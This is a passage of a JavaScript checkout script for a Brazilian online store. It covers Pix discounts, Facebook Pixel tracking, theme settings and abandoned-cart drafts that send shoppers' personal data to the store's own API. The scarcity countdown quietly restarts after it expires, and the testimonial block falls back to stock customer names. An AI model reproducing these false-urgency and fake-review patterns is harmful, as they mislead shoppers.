/**
 * Gateway Test Checkout - Core Logic (Updated with Pix Support)
 * Caminho: js/app.js
 */

document.addEventListener('DOMContentLoaded', () => {
  
  // Identificação do Dispositivo e Adaptação de Layout (Mobile vs Desktop)
  const initDeviceLayout = () => {
    const isMobile = window.innerWidth <= 1024 || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    const orderSummaryBox = document.querySelector('.order-summary-box');
    const stepsContainer = document.querySelector('.checkout-steps-container');
    const summarySection = document.querySelector('.checkout-summary');
    let toggleBar = document.getElementById('mobile-summary-toggle');
    
    if (isMobile) {
      document.body.classList.remove('device-desktop');
      document.body.classList.add('device-mobile');
      
      if (!toggleBar && orderSummaryBox && stepsContainer) {
        toggleBar = document.createElement('div');
        toggleBar.id = 'mobile-summary-toggle';
        toggleBar.className = 'mobile-summary-toggle open';
        toggleBar.innerHTML = `
          <div class="toggle-left">
            <span id="mobile-summary-toggle-text">Resumo do pedido</span>
          </div>
          <div class="toggle-right">
            <span id="mobile-summary-total-val">R$ 0,00</span>
            <i class="fa-solid fa-chevron-down chevron-icon"></i>
          </div>
        `;
        
        // Inserir antes da barra de passos
        stepsContainer.parentNode.insertBefore(toggleBar, stepsContainer);
        
        // Mover a caixa de resumo para ficar logo após o toggle e abri-la por padrão
        orderSummaryBox.classList.add('open');
        toggleBar.parentNode.insertBefore(orderSummaryBox, toggleBar.nextSibling);
        
        // Configurar o clique do toggle
        toggleBar.addEventListener('click', () => {
          toggleBar.classList.toggle('open');
          orderSummaryBox.classList.toggle('open');
        });
      } else if (toggleBar && orderSummaryBox) {
        // Garantir que no mobile comece aberto
        toggleBar.classList.add('open');
        orderSummaryBox.classList.add('open');
      }
    } else {
      document.body.classList.remove('device-mobile');
      document.body.classList.add('device-desktop');
      
      // Mover a caixa de resumo de volta para a seção lateral de resumo no desktop
      if (orderSummaryBox && summarySection) {
        orderSummaryBox.classList.remove('open');
        if (orderSummaryBox.parentNode !== summarySection) {
          summarySection.insertBefore(orderSummaryBox, summarySection.firstChild);
        }
      }
      
      // Remover a barra de toggle mobile
      if (toggleBar) {
        toggleBar.remove();
      }
    }
  };

  initDeviceLayout();
  window.addEventListener('resize', initDeviceLayout);
  
  // ==========================================
  // 0. SESSÃO LOCAL, DRAFT E FACEBOOK PIXEL
  // ==========================================
  // Gerar ID de Sessão único para rastreamento de rascunhos (carrinho abandonado)
  let checkoutSessionId = localStorage.getItem('checkout_session_id');
  if (!checkoutSessionId) {
    checkoutSessionId = generateUUID();
    localStorage.setItem('checkout_session_id', checkoutSessionId);
  }

  let discountPixPercent = 10;
  let activeCoupon = null;
  let dbWaStoreName = 'Nome da Loja';
  let dbWaMsgPix = `Olá {nome} tudo bem? 😁

Parabéns, você escolheu um produto incrível! 🤩

📦 O seu pedido já está sendo reservado, só estamos esperando a confirmação do pagamento para prepararmos o envio.

📌 Detalhes do Pedido: {pedido}
{produtos}

🏷️ Pagamento: PIX
💵 Valor: {valor}

⚠️ Caso seu código PIX tenha expirado é só gerar um novo.

Se preferir pode usar outras formas de pagamento como Boleto ou Cartão. 

Obs: Caso já tenha realizado o pagamento, enviaremos uma mensagem confirmando a compra :)`;

  // Inicialização dinâmica do Facebook Pixel
  function loadFacebookPixel(pixelId) {
    if (!pixelId) return;
    
    if (!window.fbq) {
      !function(f,b,e,v,n,t,s)
      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
      n.queue=[];t=b.createElement(e);t.async=!0;
      t.src=v;s=b.getElementsByTagName(e)[0];
      s.parentNode.insertBefore(t,s)}(window, document,'script',
      'https://connect.facebook.net/en_US/fbevents.js');
    }
    
    fbq('init', pixelId);
    fbq('trackSingle', pixelId, 'PageView');
    console.log(`🎯 Facebook Pixel ${pixelId} inicializado com trackSingle PageView.`);
  }

  // Disparar evento de rastreamento do Pixel
  function trackPixelEvent(eventName, eventData = {}) {
    if (window.fbq) {
      if (window.facebookPixels && window.facebookPixels.length > 0) {
        window.facebookPixels.forEach(p => {
          if (p.id) {
            fbq('trackSingle', p.id, eventName, eventData);
            console.log(`🎯 Facebook Pixel ${p.id} evento '${eventName}' enviado via trackSingle:`, eventData);
          }
        });
      } else {
        fbq('track', eventName, eventData);
        console.log(`🎯 Facebook Pixel evento '${eventName}' enviado via fbq('track'):`, eventData);
      }
    } else {
      console.log(`⚠️ fbq indisponível. Ignorando evento '${eventName}'`);
    }
  }

  // Atualizar opções de frete dinamicamente
  function updateShippingOptionsDOM(data) {
    const stdOption = document.querySelector('input[name="shipping_method"][value="standard"]');
    if (stdOption) {
      const stdParent = stdOption.closest('.shipping-option');
      if (stdParent) {
        const titleSpan = stdParent.querySelector('.option-title');
        const timeSpan = stdParent.querySelector('.option-time');
        const priceSpan = stdParent.querySelector('.option-price');
        
        if (titleSpan && data.shipping_standard_name) titleSpan.textContent = data.shipping_standard_name;
        if (timeSpan && data.shipping_standard_time) timeSpan.textContent = data.shipping_standard_time;
        if (priceSpan && data.shipping_standard_price !== undefined) {
          const price = parseFloat(data.shipping_standard_price) || 0;
          priceSpan.setAttribute('data-price', price.toFixed(2));
          priceSpan.textContent = price === 0 ? 'Grátis' : price.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
        }
      }
    }

    const expOption = document.querySelector('input[name="shipping_method"][value="express"]');
    if (expOption) {
      const expParent = expOption.closest('.shipping-option');
      if (expParent) {
        const titleSpan = expParent.querySelector('.option-title');
        const timeSpan = expParent.querySelector('.option-time');
        const priceSpan = expParent.querySelector('.option-price');
        
        if (titleSpan && data.shipping_express_name) titleSpan.textContent = data.shipping_express_name;
        if (timeSpan && data.shipping_express_time) timeSpan.textContent = data.shipping_express_time;
        if (priceSpan && data.shipping_express_price !== undefined) {
          const price = parseFloat(data.shipping_express_price) || 0;
          priceSpan.setAttribute('data-price', price.toFixed(2));
          priceSpan.textContent = price === 0 ? 'Grátis' : price.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
        }
      }
    }

    if (typeof calculateTotals === 'function') {
      calculateTotals();
    }
  }

  // Função para aplicar as configurações personalizadas de tema visual do checkout
  function applyThemeConfig(config) {
    if (!config) return;
    
    // 1. Tipografia (Google Fonts)
    if (config.typography) {
      const fontId = 'dynamic-google-font';
      let linkEl = document.getElementById(fontId);
      if (!linkEl) {
        linkEl = document.createElement('link');
        linkEl.id = fontId;
        linkEl.rel = 'stylesheet';
        document.head.appendChild(linkEl);
      }
      linkEl.href = `https://fonts.googleapis.com/css2?family=${encodeURIComponent(config.typography)}:wght@300;400;500;600;700&display=swap`;
    }

    // Helper para escurecer cor (para hover dos botões primários)
    function darkenColor(hex, percent) {
      try {
        hex = hex.replace('#', '');
        let r = parseInt(hex.substring(0, 2), 16);
        let g = parseInt(hex.substring(2, 4), 16);
        let b = parseInt(hex.substring(4, 6), 16);

        r = Math.max(0, Math.min(255, Math.floor(r * (1 - percent / 100))));
        g = Math.max(0, Math.min(255, Math.floor(g * (1 - percent / 100))));
        b = Math.max(0, Math.min(255, Math.floor(b * (1 - percent / 100))));

        const rHex = r.toString(16).padStart(2, '0');
        const gHex = g.toString(16).padStart(2, '0');
        const bHex = b.toString(16).padStart(2, '0');

        return `#${rHex}${gHex}${bHex}`;
      } catch (e) {
        return hex;
      }
    }

    // 2. Injeção de Estilos Dinâmicos (CSS Variables & Overrides)
    const styleEl = document.getElementById('dynamic-checkout-styles');
    if (styleEl) {
      const primaryColor = config.colorPrimary || '#164620';
      const primaryHover = config.colorPrimary ? darkenColor(config.colorPrimary, 10) : '#0f3016';
      
      let cssRules = `
        :root {
          --primary-color: ${primaryColor} !important;
          --primary-hover: ${primaryHover} !important;
          --text-primary: ${config.colorTextMain || '#111827'} !important;
          --text-secondary: ${config.colorTextMuted || '#6b7280'} !important;
          --bg-color: ${config.colorPageBg || '#f4f6fa'} !important;
          --panel-bg: ${config.stepBgColor || '#ffffff'} !important;
          --panel-border: ${config.stepBorderColor || '#e5e7eb'} !important;
          --border-radius: ${config.stepBorderRadius || '12px'} !important;
        }
      `;

      if (config.typography) {
        cssRules += `
          :root {
            --font-sans: '${config.typography}', sans-serif !important;
          }
          body, input, select, button, textarea {
            font-family: '${config.typography}', var(--font-sans) !important;
          }
        `;
      }

      // Adicionar cor de fundo do cabeçalho
      if (config.colorHeaderBg) {
        cssRules += `
          #checkout-header-element {
            background-color: ${config.colorHeaderBg} !important;
            ${config.colorHeaderBg !== 'transparent' && config.colorHeaderBg !== '' ? 'padding: 15px 20px !important; border-radius: 12px !important;' : ''}
          }
        `;
      }

      // Alinhamento do logotipo
      if (config.logoCenter) {
        cssRules += `
          #checkout-header-element {
            position: relative !important;
            display: flex !important;
            align-items: center !important;
            justify-content: space-between !important;
          }
          #checkout-logo-container {
            width: 100% !important;
            justify-content: center !important;
            display: flex !important;
          }
          #back-to-store-link {
            position: absolute !important;
            left: 0 !important;
            z-index: 10 !important;
          }
          #checkout-env-badge {
            position: absolute !important;
            right: 0 !important;
            z-index: 10 !important;
          }
          @media (max-width: 768px) {
            #checkout-header-element {
              flex-direction: row !important;
              justify-content: space-between !important;
              align-items: center !important;
              width: 100% !important;
            }
            #checkout-logo-container {
              width: auto !important;
              justify-content: flex-start !important;
              margin: 0 !important;
            }
            #back-to-store-link {
              position: static !important;
            }
            #checkout-env-badge {
              position: static !important;
              margin-left: auto !important;
            }
          }
        `;
      } else {
        cssRules += `
          #checkout-header-element {
            display: flex !important;
            align-items: center !important;
            justify-content: flex-start !important;
            gap: 20px !important;
          }
          #checkout-logo-container {
            display: flex !important;
            justify-content: flex-start !important;
            width: auto !important;
          }
          #checkout-env-badge {
            margin-left: auto !important;
          }
          @media (max-width: 768px) {
            #checkout-header-element {
              flex-direction: row !important;
              justify-content: space-between !important;
              align-items: center !important;
              width: 100% !important;
            }
            #checkout-logo-container {
              display: flex !important;
              justify-content: flex-start !important;
              width: auto !important;
              margin: 0 !important;
            }
            #checkout-env-badge {
              margin-left: auto !important;
            }
          }
        `;
      }

      // Estilos customizados para o botão de checkout
      cssRules += `
        #btn-submit-checkout {
          background-color: var(--primary-color) !important;
        }
        #btn-submit-checkout:hover {
          background-color: var(--primary-hover) !important;
          transform: translateY(-1px);
        }
        #btn-submit-checkout.style-glow {
          box-shadow: 0 0 15px var(--primary-color) !important;
          animation: pulse-glow-btn 2s infinite !important;
        }
        #btn-submit-checkout.style-gradient {
          background: linear-gradient(135deg, var(--primary-color) 0%, #1d4ed8 100%) !important;
          border: none !important;
        }
        @keyframes pulse-glow-btn {
          0% { box-shadow: 0 0 0 0 rgba(124, 77, 255, 0.4); }
          70% { box-shadow: 0 0 0 10px rgba(124, 77, 255, 0); }
          100% { box-shadow: 0 0 0 0 rgba(124, 77, 255, 0); }
        }
      `;

      // Estilos customizados de rodapé
      if (config.footerBgColor) {
        cssRules += `
          #checkout-footer-element {
            background-color: ${config.footerBgColor} !important;
            --footer-bg: ${config.footerBgColor} !important;
          }
        `;
      }
      if (config.footerTextColor) {
        cssRules += `
          #checkout-footer-element {
            color: ${config.footerTextColor} !important;
            --footer-color: ${config.footerTextColor} !important;
          }
          #checkout-footer-element h3,
          #checkout-footer-element p,
          #checkout-footer-element span,
          #checkout-footer-element i {
            color: ${config.footerTextColor} !important;
          }
        `;
      }

      styleEl.innerHTML = cssRules;
    }

    // 3. Logomarca e Favicon
    const customLogoImg = document.getElementById('checkout-custom-logo');
    const logoIcon = document.getElementById('checkout-logo-icon');
    const logoText = document.getElementById('checkout-logo-text');
    
    if (config.logo) {
      if (customLogoImg) {
        customLogoImg.src = config.logo;
        customLogoImg.classList.remove('hide');
        const logoWidth = config.logoWidth || 130;
        const logoHeight = Math.round((150 / 130) * logoWidth);
        customLogoImg.style.width = logoWidth + 'px';
        customLogoImg.style.height = 'auto';
        customLogoImg.style.maxWidth = '100%';
        customLogoImg.style.maxHeight = logoHeight + 'px';
        customLogoImg.style.objectFit = 'contain';
      }
      const logoContainer = document.getElementById('checkout-logo-container');
      if (logoContainer) {
        if (config.logoCenter) {
          logoContainer.style.justifyContent = 'center';
          logoContainer.style.width = '100%';
        } else {
          logoContainer.style.justifyContent = 'flex-start';
          logoContainer.style.width = 'auto';
        }
      }
      if (logoIcon) {
        logoIcon.classList.add('hide');
        logoIcon.style.setProperty('display', 'none', 'important');
      }
      if (logoText) {
        logoText.classList.add('hide');
        logoText.style.setProperty('display', 'none', 'important');
      }
    } else {
      if (customLogoImg) {
        customLogoImg.src = '';
        customLogoImg.classList.add('hide');
      }
      if (logoIcon) {
        logoIcon.classList.add('hide');
        logoIcon.style.setProperty('display', 'none', 'important');
      }
      if (logoText) {
        logoText.textContent = config.footerStoreName || 'Checkout';
        logoText.classList.remove('hide');
        logoText.style.removeProperty('display');
      }
    }

    if (config.favicon) {
      let favLink = document.querySelector("link[rel*='icon']");
      if (!favLink) {
        favLink = document.createElement('link');
        favLink.rel = 'icon';
        document.head.appendChild(favLink);
      }
      favLink.href = config.favicon;
    }

    // 4. Barra de Avisos
    const annBar = document.getElementById('announcement-bar-checkout');
    if (annBar) {
      if (config.announcementActive) {
        annBar.innerText = config.announcementText || 'FRETE GRÁTIS hoje para todo o Brasil!';
        annBar.style.background = config.announcementBg || '#7c4dff';
        annBar.style.color = config.announcementColor || '#ffffff';
        annBar.classList.remove('hide');
      } else {
        annBar.classList.add('hide');
      }
    }

    // 5. Botão Voltar para a Loja (Integrado no Logotipo)
    const backLink = document.getElementById('back-to-store-link');
    const backLogoLink = document.getElementById('back-to-store-logo-link');
    const backText = document.getElementById('back-to-store-text');
    
    if (backLogoLink) {
      backLogoLink.href = config.backLinkUrl || '#';
    }
    if (backLink) {
      if (config.backLinkActive) {
        backLink.href = config.backLinkUrl || '#';
        if (backText) backText.innerText = config.backLinkText || 'Voltar para a Loja';
        backLink.classList.remove('hide');
      } else {
        backLink.classList.add('hide');
      }
    }

    // 6. Banners Promocionais (com Resize Listener)
    const promoBanner = document.getElementById('checkout-promo-banner');
    const bannerDesktop = document.getElementById('checkout-banner-desktop');
    const bannerMobile = document.getElementById('checkout-banner-mobile');
    
    if (promoBanner) {
      if (config.bannerActive) {
        promoBanner.classList.remove('hide');
        
        function updateBannerSource() {
          const isMobileViewport = window.innerWidth < 768;
          if (isMobileViewport) {
            if (bannerDesktop) bannerDesktop.classList.add('hide');
            if (bannerMobile) {
              bannerMobile.src = config.bannerMobile || config.bannerDesktop || '';
              if (bannerMobile.src) {
                bannerMobile.classList.remove('hide');
              } else {
                bannerMobile.classList.add('hide');
              }
            }
          } else {
            if (bannerMobile) bannerMobile.classList.add('hide');
            if (bannerDesktop) {
              bannerDesktop.src = config.bannerDesktop || config.bannerMobile || '';
              if (bannerDesktop.src) {
                bannerDesktop.classList.remove('hide');
              } else {
                bannerDesktop.classList.add('hide');
              }
            }
          }
        }
        
        updateBannerSource();
        // Evitar múltiplos event listeners acumulando
        window.removeEventListener('resize', window._updateBannerSourceFn);
        window._updateBannerSourceFn = updateBannerSource;
        window.addEventListener('resize', window._updateBannerSourceFn);
      } else {
        promoBanner.classList.add('hide');
        if (bannerDesktop) bannerDesktop.classList.add('hide');
        if (bannerMobile) bannerMobile.classList.add('hide');
      }
    }

    // 7. Cronômetro de Escassez
    const scarcityBar = document.getElementById('checkout-urgency-timer');
    const scarcityMessage = document.getElementById('checkout-timer-message');
    const scarcityCountdown = document.getElementById('checkout-timer-countdown');
    const scarcityProgress = document.getElementById('checkout-timer-progress');
    
    if (scarcityBar) {
      if (config.scarcityActive) {
        scarcityBar.classList.remove('hide');
        if (scarcityMessage) scarcityMessage.innerText = config.scarcityText || 'Desconto reservado! Garanta antes que o tempo acabe:';
        if (scarcityProgress) scarcityProgress.style.background = config.scarcityBarColor || '#ef4444';
        
        // Timer de escassez persistente na sessão
        const durationSec = (parseInt(config.scarcityDuration) || 15) * 60;
        const nowSec = Math.floor(Date.now() / 1000);
        let expiryTime = sessionStorage.getItem('checkout_timer_expiry');
        
        if (!expiryTime) {
          expiryTime = nowSec + durationSec;
          sessionStorage.setItem('checkout_timer_expiry', expiryTime);
        } else {
          expiryTime = parseInt(expiryTime);
          if (expiryTime < nowSec) {
            expiryTime = nowSec + durationSec;
            sessionStorage.setItem('checkout_timer_expiry', expiryTime);
          }
        }
        
        if (window._scarcityTimerInterval) {
          clearInterval(window._scarcityTimerInterval);
        }
        
        function tickTimer() {
          const currentNow = Math.floor(Date.now() / 1000);
          const secondsLeft = expiryTime - currentNow;
          
          if (secondsLeft <= 0) {
            clearInterval(window._scarcityTimerInterval);
            if (scarcityCountdown) scarcityCountdown.innerText = '00:00';
            if (scarcityProgress) scarcityProgress.style.width = '0%';
          } else {
            const m = String(Math.floor(secondsLeft / 60)).padStart(2, '0');
            const s = String(secondsLeft % 60).padStart(2, '0');
            if (scarcityCountdown) scarcityCountdown.innerText = `${m}:${s}`;
            
            const percent = (secondsLeft / durationSec) * 100;
            if (scarcityProgress) scarcityProgress.style.width = `${percent}%`;
          }
        }
        
        tickTimer();
        window._scarcityTimerInterval = setInterval(tickTimer, 1000);
      } else {
        scarcityBar.classList.add('hide');
        if (window._scarcityTimerInterval) {
          clearInterval(window._scarcityTimerInterval);
        }
      }
    }

    // 8. Depoimentos de Clientes
    const testimonialsBox = document.getElementById('checkout-testimonials-container');
    const testimonialsTitle = document.getElementById('checkout-testimonials-title');
    
    if (testimonialsBox) {
      if (config.summaryShowTestimonials) {
        testimonialsBox.classList.remove('hide');
        if (testimonialsTitle) testimonialsTitle.innerText = config.testimonialsTitle || 'O que dizem nossos clientes:';
        
        const t1Name = document.getElementById('checkout-testimonial-1-name');
        const t1Text = document.getElementById('checkout-testimonial-1-text');
        if (t1Name) t1Name.innerText = config.testimonial1Name || 'Mariana Silva';
        if (t1Text) t1Text.innerText = config.testimonial1Text || '';
        
        const t2Name = document.getElementById('checkout-testimonial-2-name');
        const t2Text = document.getElementById('checkout-testimonial-2-text');
        if (t2Name) t2Name.innerText = config.testimonial2Name || 'Carlos Eduardo';
        if (t2Text) t2Text.innerText = config.testimonial2Text || '';
        
        const t3Name = document.getElementById('checkout-testimonial-3-name');
        const t3Text = document.getElementById('checkout-testimonial-3-text');
        if (t3Name) t3Name.innerText = config.testimonial3Name || 'Beatriz Souza';
        if (t3Text) t3Text.innerText = config.testimonial3Text || '';
      } else {
        testimonialsBox.classList.add('hide');
      }
    }

    // 9. Customização do Botão de Envio Principal
    const submitBtn = document.getElementById('btn-submit-checkout');
    if (submitBtn) {
      const btnTextSpan = submitBtn.querySelector('.btn-text');
      if (btnTextSpan) {
        let text = config.btnText || 'Finalizar Compra';
        if (text === 'Concluir Compra Segura') {
          text = 'Finalizar Compra';
        }
        let hasLock = !!config.btnLockIcon;
        if (config.btnText === 'Concluir Compra Segura') {
          hasLock = false;
        }
        let iconHtml = '';
        if (hasLock) {
          iconHtml = '<i class="fa-solid fa-lock" style="margin-right: 8px;"></i>';
        }
        btnTextSpan.innerHTML = iconHtml + text;
      }
      
      submitBtn.classList.remove('style-glow', 'style-gradient');
      if (config.btnStyle === 'glow') {
        submitBtn.classList.add('style-glow');
      } else if (config.btnStyle === 'gradient') {
        submitBtn.classList.add('style-gradient');
      }
    }

    // 10. Produto Customizado no Resumo da Compra (se não for Shopify redirect)
    const urlParams = new URLSearchParams(window.location.search);
    const hasShopifyProduct = urlParams.get('title') && urlParams.get('price');
    
    if (!hasShopifyProduct) {
      const prodName = document.getElementById('checkout-product-name-val');
      const prodSize = document.getElementById('checkout-product-size-val');
      const prodPriceEl = document.getElementById('checkout-product-price-val');
      const baseAmountInput = document.getElementById('base-amount');
      
      const customPrice = parseFloat(config.productPrice !== undefined ? config.productPrice : 129.90);
      const customName = config.productName || 'Pacote Sandbox Elite';
      const customSize = config.productSize || 'Acesso para testes ilimitados';
      
      if (prodName) prodName.textContent = customName;
      if (prodSize) prodSize.textContent = customSize;
      
      const qtyValEl = document.getElementById('checkout-qty-val');
      const qty = parseInt(qtyValEl ? qtyValEl.textContent : 1) || 1;
      
      const formattedPrice = 'R$ ' + (customPrice * qty).toFixed(2).replace('.', ',');
      if (prodPriceEl) prodPriceEl.textContent = formattedPrice;
      
      if (baseAmountInput) {
        baseAmountInput.value = (customPrice * qty).toFixed(2);
        // Force calculation
        if (typeof calculateTotals === 'function') {
          calculateTotals();
        }
      }
    }

    // Rodapé Customizável da Loja
    const footerStoreNameText = document.getElementById('footer-store-name-text');
    const footerStoreCnpjText = document.getElementById('footer-store-cnpj-text');
    const footerStoreAddressText = document.getElementById('footer-store-address-text');
    const footerStoreContactText = document.getElementById('footer-store-contact-text');
    const footerStoreCopyright = document.getElementById('footer-store-copyright');
    const footerYear = document.getElementById('footer-year');

    if (footerYear) {
      footerYear.innerText = new Date().getFullYear();
    }
    if (config.footerStoreName) {
      if (footerStoreNameText) footerStoreNameText.innerText = config.footerStoreName;
      if (footerStoreCopyright) footerStoreCopyright.innerText = config.footerStoreName;
    }
    if (config.footerStoreCnpj) {
      if (footerStoreCnpjText) footerStoreCnpjText.innerText = `CNPJ: ${config.footerStoreCnpj}`;
    }
    if (config.footerStoreAddress) {
      if (footerStoreAddressText) footerStoreAddressText.innerText = config.footerStoreAddress;
    }
    if (config.footerStoreEmail || config.footerStorePhone) {
      const emailPart = config.footerStoreEmail ? `E-mail: ${config.footerStoreEmail}` : '';
      const phonePart = config.footerStorePhone ? `Telefone: ${config.footerStorePhone}` : '';
      const spacer = (emailPart && phonePart) ? ' | ' : '';
      if (footerStoreContactText) footerStoreContactText.innerText = `${emailPart}${spacer}${phonePart}`;
    }

    // 11. Forma de Pagamento Padrão
    if (config.defaultPaymentMethod) {
      if (typeof switchPaymentMethod === 'function') {
        switchPaymentMethod(config.defaultPaymentMethod, true);
      }
    }
    
    // 12. Mostrar/Ocultar Campo de Cupom
    const couponContainer = document.getElementById('checkout-coupon-container');
    if (couponContainer) {
      if (config.summaryHideCoupon) {
        couponContainer.classList.add('hide');
      } else {
        couponContainer.classList.remove('hide');
      }
    }
  }

  // Função auxiliar para aplicar as configurações no DOM e iniciar pixels
  function applyConfigData(data) {
    if (!data) return;

    // Múltiplos Pixels
    window.facebookPixels = [];
    if (data.facebook_pixels) {
      try {
        window.facebookPixels = JSON.parse(data.facebook_pixels);
      } catch (e) {
        console.error('Erro ao ler facebook_pixels no checkout:', e);
      }
    }
    
    // Sincronização inicial de retrocompatibilidade
    if (window.facebookPixels.length === 0 && data.facebook_pixel_id) {
      window.facebookPixels.push({ id: data.facebook_pixel_id, token: data.facebook_pixel_token });
    }

    // Inicializar todos os pixels
    if (window.facebookPixels.length > 0) {
      window.facebookPixels.forEach(p => {
        if (p.id) {
          loadFacebookPixel(p.id);
        }
      });
    }

    if (data.discount_pix_percent !== undefined) {
      discountPixPercent = parseFloat(data.discount_pix_percent) || 0;
    }
    
    if (data.checkout_wa_store_name) {
      dbWaStoreName = data.checkout_wa_store_name;
    }
    if (data.checkout_wa_msg_pix) {
      dbWaMsgPix = data.checkout_wa_msg_pix;
    }
    
    // Atualizar fretes com dados reais do banco
    updateShippingOptionsDOM(data);

    // Carregar configurações de tema visual personalizado
    if (data.checkout_theme_config) {
      try {
        const themeConfig = JSON.parse(data.checkout_theme_config);
        window._currentThemeConfig = themeConfig;
        applyThemeConfig(themeConfig);
      } catch (e) {
        console.error('Erro ao ler checkout_theme_config:', e);
      }
    }
  }

  // Buscar configurações globais e inicializar Pixel com cache reativo local (carregamento instantâneo)
  async function initConfigsAndPixel() {
    // 1. Tentar ler do localStorage para renderização imediata da logo e estilos
    const cachedConfig = localStorage.getItem('cached_checkout_config');
    if (cachedConfig) {
      try {
        const cachedData = JSON.parse(cachedConfig);
        applyConfigData(cachedData);
        calculateTotals();
      } catch (e) {
        console.error('Erro ao ler configurações em cache:', e);
      }
    }

    // 2. Fazer requisição na rede em segundo plano para manter atualizado
    try {
      const res = await fetch('/api/config');
      if (res.ok) {
        const data = await res.json();
        
        // Salvar em cache para o próximo carregamento instantâneo
        localStorage.setItem('cached_checkout_config', JSON.stringify(data));
        
        // Aplicar os dados novos na interface
        applyConfigData(data);
        calculateTotals();
      }
    } catch (err) {
      console.error('Erro ao inicializar configurações e Pixel:', err);
    }
  }

  initConfigsAndPixel();

  // Helper para salvar rascunho de checkout em tempo real no Supabase
  async function saveCheckoutDraft(stepName) {
    const selectedMethod = document.getElementById('selected-payment-method').value;
    const subtotal = parseFloat(amountInput.value) || 0;
    
    let shippingPrice = 15.00;
    let shippingMethodVal = 'standard';
    const selectedRadio = document.querySelector('input[name="shipping_method"]:checked');
    if (selectedRadio) {
      shippingMethodVal = selectedRadio.value;
      const priceSpan = selectedRadio.closest('.shipping-option').querySelector('.option-price');
      shippingPrice = parseFloat(priceSpan.getAttribute('data-price')) || 0;
    }

    let couponDiscountVal = 0;
    if (activeCoupon) {
      if (activeCoupon.discount_type === 'percentage') {
        couponDiscountVal = parseFloat((subtotal * (activeCoupon.discount_value / 100)).toFixed(2));
      } else if (activeCoupon.discount_type === 'fixed') {
        couponDiscountVal = parseFloat(activeCoupon.discount_value);
      }
      if (couponDiscountVal > subtotal) {
        couponDiscountVal = subtotal;
      }
    }
    let subtotalAfterCoupon = subtotal - couponDiscountVal;
    if (subtotalAfterCoupon < 0) subtotalAfterCoupon = 0;

    let discountVal = 0;
    if (selectedMethod === 'pix' && discountPixPercent > 0) {
      discountVal = parseFloat((subtotalAfterCoupon * (discountPixPercent / 100)).toFixed(2));
    }
    const totalAmount = parseFloat((subtotalAfterCoupon + shippingPrice - discountVal).toFixed(2));

    const itemsPayload = shopifyCartItems && shopifyCartItems.length > 0 ? shopifyCartItems.map(item => ({
      name: item.title,
      price: parseFloat(item.price) || 0,
      quantity: parseInt(item.quantity) || 1,
      sku: item.sku || 'SHPFY-DEFAULT',
      shopify_variant_id: item.variant_id || null
    })) : (shpfyProductTitle ? [
      {
        name: shpfyProductTitle,
        price: shpfyProductPrice,
        quantity: shpfyProductQuantity,
        sku: shpfyProductSku,
        shopify_variant_id: shpfyVariantId
      }
    ] : [
      {
        name: "Pacote Sandbox Elite",
        price: subtotal,
        quantity: 1,
        sku: "SANDBOX-ELITE-PK"
      }
    ]);

    const payload = {
      checkout_session_id: checkoutSessionId,
      payment_method: selectedMethod,
      domain: window.location.hostname,
      
      // Cliente
      customer_name: document.getElementById('customer_name').value || null,
      customer_email: document.getElementById('customer_email').value || null,
      customer_phone: phoneInput.value || null,
      customer_cpf: cpfInput.value || null,

      // Endereço
      cep: cepInput.value || null,
      street: document.getElementById('street').value || null,
      street_number: document.getElementById('street_number').value || null,
      complement: document.getElementById('complement').value || null,
      neighborhood: document.getElementById('neighborhood').value || null,
      city: document.getElementById('city').value || null,
      state: document.getElementById('state').value ? document.getElementById('state').value.toUpperCase() : null,

      // Entrega & Pedido
      shipping_method: shippingMethodVal,
      shipping_price: shippingPrice,
      items: itemsPayload,
      amount: totalAmount,

      // Cupom de Desconto
      coupon_code: activeCoupon ? activeCoupon.code : null,
      coupon_discount: activeCoupon ? couponDiscountVal : 0,
      coupon_type: activeCoupon ? activeCoupon.discount_type : null,
      
      status: "draft",
      funnel_step: stepName
    };

    try {
      console.log(`📝 Salvando rascunho de checkout (${stepName})...`);
      const response = await fetch('/api/checkout', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });
      const resData = await response.json();
      console.log('✅ Rascunho atualizado com sucesso no Supabase:', resData);
    } catch (err) {
      console.error('❌ Falha ao salvar rascunho:', err);
    }
  }
  
  // ==========================================
  // 1. GERENCIAMENTO DAS SEÇÕES (ACCORDION)
  // ==========================================
  const sections = document.querySelectorAll('.checkout-section');
  
  // Função para atualizar a barra de progresso horizontal superior
  function updateTopProgressBar() {
    const steps = document.querySelectorAll('.progress-step');
    const lines = document.querySelectorAll('.progress-line');
    
    let activeStep = 1;
    const activeSection = document.querySelector('.checkout-section.active');
    if (activeSection) {
      activeStep = parseInt(activeSection.getAttribute('data-step')) || 1;
    }
    
    steps.forEach(step => {
      const stepNum = parseInt(step.getAttribute('data-step'));
      const iconEl = step.querySelector('.step-icon');
      
      if (stepNum < activeStep) {
        step.classList.add('completed');
        step.classList.remove('active');
        if (iconEl) {
          iconEl.innerHTML = '<i class="fa-solid fa-check"></i>';
        }
      } else if (stepNum === activeStep) {
        step.classList.add('active');
        step.classList.remove('completed');
        if (iconEl) {
          if (stepNum === 1) {
            iconEl.innerHTML = '1';
          } else if (stepNum === 2) {
            iconEl.innerHTML = '2';
          } else {
            iconEl.innerHTML = '<i class="fa-solid fa-lock" style="font-size: 0.7rem;"></i>';
          }
        }
      } else {
        step.classList.remove('active', 'completed');
        if (iconEl) {
          if (stepNum === 2) {
            iconEl.innerHTML = '2';
          } else {
            iconEl.innerHTML = '<i class="fa-solid fa-lock" style="font-size: 0.7rem;"></i>';
          }
        }
      }
    });
    
    lines.forEach(line => {
      const lineNum = parseInt(line.getAttribute('data-line'));
      if (lineNum < activeStep) {
        line.classList.add('active');
      } else {
        line.classList.remove('active');
      }
    });
  }

  // Função para copiar dados digitados para o resumo compacto de etapas concluídas
  function updateCompletedSummaries() {
    // Step 1: Identificação
    const nameVal = document.getElementById('customer_name').value.trim();
    const emailVal = document.getElementById('customer_email').value.trim();
    const phoneVal = document.getElementById('customer_phone').value.trim();
    
    const summaryName = document.getElementById('summary-val-name');
    const summaryEmail = document.getElementById('summary-val-email');
    const summaryPhone = document.getElementById('summary-val-phone');
    
    if (summaryName) summaryName.textContent = nameVal || '-';
    if (summaryEmail) summaryEmail.textContent = emailVal || '-';
